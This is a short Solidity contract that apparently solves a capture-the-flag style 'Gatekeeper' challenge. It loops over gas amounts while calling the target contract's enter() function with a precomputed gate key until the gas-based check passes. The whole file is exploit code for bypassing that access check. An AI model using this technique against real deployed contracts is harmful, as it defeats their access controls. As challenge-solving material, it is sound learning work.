// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Gatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract FindGas {
    Gatekeeper challengeContract =
        Gatekeeper(0xe6068109E1fEB290b0B54a1D7BDD28cE47326c22);
    event GasFound(uint256 gasValue);

    // gateKey = 0x1aa6736e000022a5
    function findGas(bytes8 gateKey) public {
        bool success = false;
        uint256 gasValue = 0;

        for (uint256 testValue = 0; testValue <= 10000; testValue++) {
            (success, ) = payable(0xe6068109E1fEB290b0B54a1D7BDD28cE47326c22)
                .call{gas: testValue + (8191 * 4)}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );

            if (success) {
                gasValue = testValue + (8191 * 4);
                break;
            }
        }

        require(success, "Couldn't find a value for gas that fits");
        emit GasFound(gasValue);
    }
}
